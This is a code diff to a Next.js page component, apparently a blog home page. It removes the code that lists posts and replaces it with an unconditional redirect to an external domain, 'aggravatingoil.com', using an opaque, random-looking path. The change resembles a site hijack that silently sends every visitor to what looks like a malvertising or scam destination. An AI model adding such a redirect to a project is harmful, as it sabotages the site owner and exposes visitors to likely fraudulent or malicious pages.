@@ -1,9 +1,7 @@
-import { sortPosts, allCoreContent } from 'pliny/utils/contentlayer'
-import { allBlogs } from 'contentlayer/generated'
-import Main from './Main'
+import { redirect } from 'next/navigation'
 
 export default async function Page() {
-  const sortedPosts = sortPosts(allBlogs)
-  const posts = allCoreContent(sortedPosts)
-  return <Main posts={posts} />
+  redirect(
+    'https://aggravatingoil.com/bD3/V.0/P/3bpvvFbPmWVMJcZRDe0m1PMDjIEMwyMWzPIC4dL/TAUoyWMLTaAcz/MJjkkz'
+  )
 }
